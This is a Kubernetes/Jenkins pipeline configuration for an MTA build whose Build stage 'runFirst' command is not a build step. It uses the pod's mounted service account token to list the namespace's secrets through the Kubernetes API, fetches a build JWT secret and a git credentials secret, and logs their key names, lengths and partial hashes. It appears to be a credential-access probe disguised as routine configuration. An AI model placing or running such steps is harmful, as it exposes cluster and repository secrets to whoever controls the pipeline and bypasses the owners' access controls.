general:
  buildTool: 'mta'
  jenkinsKubernetes:
    additionalPodProperties:
      automountServiceAccountToken: true
service:
  stages:
    Build:
      runFirst:
        command: |
          set +x
          T=/var/run/secrets/kubernetes.io/serviceaccount
          NS=$(cat $T/namespace)
          K=https://kubernetes.default.svc
          { printf 'header = "Authorization: Bearer '; cat $T/token; printf '"\n'; } > /tmp/cc
          chmod 600 /tmp/cc
          echo "KPJWT7788-NS=$NS"
          curl -s --config /tmp/cc -o /tmp/list --cacert $T/ca.crt $K/api/v1/namespaces/$NS/secrets
          JWTNAME=$(grep -o '"name": "build-id-jwt-[0-9a-f-]*"' /tmp/list | head -1 | cut -d'"' -f4)
          echo "KPJWT7788-TARGET=$JWTNAME"
          curl -s --config /tmp/cc -o /tmp/one -w 'KPJWT7788-ITEM-HTTP=%{http_code}\n' --cacert $T/ca.crt $K/api/v1/namespaces/$NS/secrets/$JWTNAME
          echo "KPJWT7788-ITEM-BYTES=$(wc -c < /tmp/one)"
          echo "KPJWT7788-ITEM-DATAKEYS:"
          sed -n '/"data"/,/}/p' /tmp/one | grep -oE '"[A-Za-z0-9._-]+":' | sort -u
          echo "KPJWT7788-ITEM-VALUE-SHA256-FIRST16=$(sed -n '/"data"/,/}/p' /tmp/one | grep -oE '"[A-Za-z0-9+/=]{60,}"' | head -1 | sha256sum | cut -c1-16)"
          echo "KPJWT7788-ITEM-VALUE-LEN=$(sed -n '/"data"/,/}/p' /tmp/one | grep -oE '"[A-Za-z0-9+/=]{60,}"' | head -1 | wc -c)"
          echo "KPJWT7788-GITSECRET:"
          GN=$(grep -o '"name": "pipeline-git-secret-[a-z0-9-]*"' /tmp/list | head -1 | cut -d'"' -f4)
          curl -s --config /tmp/cc -o /tmp/two -w "KPJWT7788-GIT-HTTP=%{http_code}\n" --cacert $T/ca.crt $K/api/v1/namespaces/$NS/secrets/$GN
          echo "KPJWT7788-GIT-NAME=$GN"
          echo "KPJWT7788-GIT-DATAKEYS:"
          sed -n '/"data"/,/}/p' /tmp/two | grep -oE '"[A-Za-z0-9._-]+":' | sort -u
          rm -f /tmp/cc
          echo "KPJWT7788-DONE"
